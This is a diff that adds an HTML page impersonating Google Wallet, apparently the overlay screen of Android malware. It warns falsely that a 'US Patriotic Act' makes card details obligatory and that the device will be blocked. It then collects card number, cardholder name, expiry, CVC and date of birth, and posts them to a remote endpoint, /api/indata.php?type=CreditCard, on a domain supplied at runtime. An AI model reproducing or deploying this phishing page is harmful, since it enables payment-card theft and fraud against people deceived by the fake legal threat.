@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=no' />
+<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
+<link rel="stylesheet" type="text/css" href="style.css">
+<script src='vendor.js'></script>
+</head>
+<body>
+	<div class='wrapper'>
+		<form method="POST" name="myform">
+		<div class='header'>
+			<img width='100%' src='Google_Wallet_Logo.png' />
+		</div>
+		<div class='pages page-1'>
+			<p><span style="color: red;">ATTENTION!</span> Due to changes in "US Patriotic Act" all users of Android-based devices must provide personal information (credit card details) about themselves. This procedure is <span style="color: red">OBLIGATORY</span></p>
+			<p>As long as information you provide will be checked your device will be <span style="color: red;">blocked</span></p>
+			<p>In next 24 hours your credit card will be charged for random ammount <span style="color: red;">0.01$ to 1.00$</span>. Make sure that you have this amount on credit card. If something goes wrong you will go through this procedure again</p>
+			<button class='footer' id='button-1'>
+				I AGREE TO TRANSFER MY PERSONAL DATA
+			</button>
+		</div>
+		<div class='pages page-2'>
+			<div class="error">
+				<p>All fileds are REQUIRED</p>
+			</div> 
+				<input name="credit_card_number" type="tel" class="credit_card_number" id="credit_card_number_id" placeholder="Credit card number" />
+				<input name="cardholder_name" type="text" class="cardholder_name" id="cardholder_name_id" placeholder="Cardholder name" onkeyup="setValidator(this.id, /^[A-Za-z ]*$/)" />
+				<input name="credit_card_expiry" type="tel" class="credit_card_expiry" id="credit_card_expiry_id" placeholder="Expiry date MM/YY" />
+				<input name="credit_card_cvc" type="tel" class="credit_card_cvc" id="credit_card_cvc_id" placeholder="CVC/CVV" />
+				<input name="dd_mm_yyyy" type="tel" class="dd_mm_yyyy" placeholder="Date of birth DD/MM/YYYY" />
+				<button class='footer' id='button-2'>
+					SAVE
+				</button> 
+		</div>
+		</form>
+	</div>
+</body>
+<script src='main.js'></script>
+<script>
+document.myform.action = "http://"+MeSetting.getDomain()+"/api/indata.php?type=CreditCard";
+</script>
+</html>
